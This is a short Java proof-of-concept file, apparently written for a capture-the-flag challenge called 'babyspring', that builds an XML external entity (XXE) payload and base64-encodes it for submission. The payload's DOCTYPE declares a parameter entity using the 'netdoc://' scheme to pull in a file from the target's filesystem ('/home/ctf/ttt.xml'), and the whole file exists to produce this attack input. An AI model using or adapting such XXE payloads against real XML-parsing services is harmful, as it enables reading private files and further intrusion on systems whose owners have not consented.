package com.example.poc.securityPoc.demo;

import com.example.poc.securityPoc.demo.babyspring.base64;

public class test {
    public static void main(String[] args) {
        String poc="<?xml version=\"1.0\" ?>\n" +
                "<!DOCTYPE root [\n" +
                "        <!ELEMENT r ANY >\n" +
                "        <!ENTITY % sp SYSTEM \"netdoc:///home/ctf/ttt.xml\">\n" +
                "        %sp;\n" +
                "        ]>\n" +
                "<root>\n" +
                "    <input>\n" +
                "        <serviceCall>\n" +
                "            <service>1</service>\n" +
                "            <address>2</address>\n" +
                "            <operate>3</operate>\n" +
                "            <params>4</params>\n" +
                "            <return>5</return>\n" +
                "        </serviceCall>\n" +
                "    </input>\n" +
                "</root>";
        byte[] bytes = poc.getBytes();
        System.out.println(bytes);
        String s = null;
        try {
            s = base64.base64Encode(bytes);
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println(s);
    }
}
